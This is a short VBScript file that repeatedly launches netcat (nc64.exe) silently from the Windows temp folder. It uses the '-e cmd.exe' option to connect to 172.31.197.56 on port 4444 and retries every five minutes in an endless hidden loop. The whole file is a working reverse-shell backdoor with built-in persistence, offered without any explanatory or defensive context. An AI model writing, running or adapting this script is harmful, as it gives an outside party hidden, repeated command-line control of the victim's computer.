Set objShell = CreateObject("WScript.Shell")

' Get the path to the temporary folder
tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")

' Define the command to run from the temporary folder
commandToRun = """" & tempFolder & "\Quiet.exe"" """ & tempFolder & "\nc64.exe"" -e cmd.exe 172.31.197.56 4444"

' Loop indefinitely
Do
    ' Run the command
    objShell.Run commandToRun, 0, True
    
    ' Wait for 5 minutes (300,000 milliseconds)
    WScript.Sleep 300000
Loop
